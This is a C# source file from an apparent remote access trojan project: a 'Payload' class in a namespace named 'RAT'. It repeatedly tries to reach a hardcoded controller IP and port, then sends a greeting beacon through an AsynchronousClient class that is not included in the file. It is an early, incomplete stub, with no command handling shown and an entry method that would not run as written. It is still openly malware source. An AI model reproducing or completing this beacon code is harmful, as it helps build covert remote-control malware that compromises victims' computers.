using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RAT
{
    class Payload
    {
        public static Int32 port = 3456;
        public static String ServerIP = "192.168.0.45"; 
        public static void main()
        {
            Send("<GREETINGS>");
            
        }
        public static void Send(String message)
        {
            bool sending = true;
            while (sending)
            {
                if (CheckConnection())
                {
                    AsynchronousClient.StartClient(message, port, ServerIP);
                    sending = false;
                }
            }
        }
        public static bool CheckConnection()
        {
                using (TcpClient tcpClient = new TcpClient())
                {
                    try
                    {
                        tcpClient.Connect(ServerIP, port);
                        Console.WriteLine("Connecting");
                    return true;
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Cannot Connect");
                        Thread.Sleep(200);
                    return false;
                    }
                }
            }
        }
    }

